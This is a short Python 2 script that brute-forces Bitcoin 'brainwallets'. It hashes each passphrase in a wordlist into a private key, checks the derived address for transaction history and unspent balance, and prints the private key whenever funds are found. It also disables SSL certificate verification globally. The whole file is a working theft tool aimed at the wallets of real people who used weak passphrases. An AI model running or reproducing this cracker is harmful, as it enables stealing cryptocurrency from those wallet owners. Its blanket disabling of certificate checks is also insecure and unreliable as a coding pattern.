from bitcoin import *
import ssl
import argparse

#
# bypassing SSL errors due to unverified certificates
#
ssl._create_default_https_context = ssl._create_unverified_context


def create_parse():
    parser = argparse.ArgumentParser(
        description='Utility to try crack bitcoins private keys generated from weak passphrases.')
    parser.add_argument('pass_list', help='Password list')
    return parser


def count_lines(filename):
    t = 0
    with open(filename) as fp:
        for line in fp:
            t += 1
    return t


def crack(pwd_file):
    print('Using file: {}'.format(pwd_file))
    total = count_lines(pwd_file)
    log_blocks = int(total * 0.0001)
    if log_blocks == 0:
        log_blocks = total
    with open(pwd_file) as fp:
        count_exists = 0
        count_balance = 0
        count_errors = 0
        for i, pwd in enumerate(fp):
            try:
                if i % log_blocks == 0:
                    print('Progress: {0:.2f}%'.format(float(i) / total * 100.00))
                if pwd:
                    priv = sha256(pwd)
                    pub = privtopub(priv)
                    addr = pubtoaddr(pub)
                    print addr
                    h = history(addr)
                    if h and any(h):
                        count_exists += 1
                        print('Found history on address: {}'.format(addr))
                        print('For Passphrase: {}'.format(pwd))
                        # print(json.dumps(h, indent=1))
                        u = unspent(addr)
                        if u and any(u):
                            count_balance += 1
                            print('BINGO! Found also unspent')
                            print('Private Key: {}'.format(priv))
                            print('Public Key: {}'.format(pub))

            except Exception, e:
                count_errors += 1
                print('Error on {}'.format(pwd))
                print(e)

    return total, count_exists, count_balance, count_errors


def start():
    parser = create_parse()
    args = parser.parse_args()
    pass_list = args.pass_list
    total, count_exists, count_balance, count_errors = crack(pass_list)
    print('Total: {}'.format(total))
    print('Total with history: {}'.format(count_exists))
    print('Total with balance: {}'.format(count_balance))
    print('Total errors: {}'.format(count_errors))


if __name__ == '__main__':
    start()
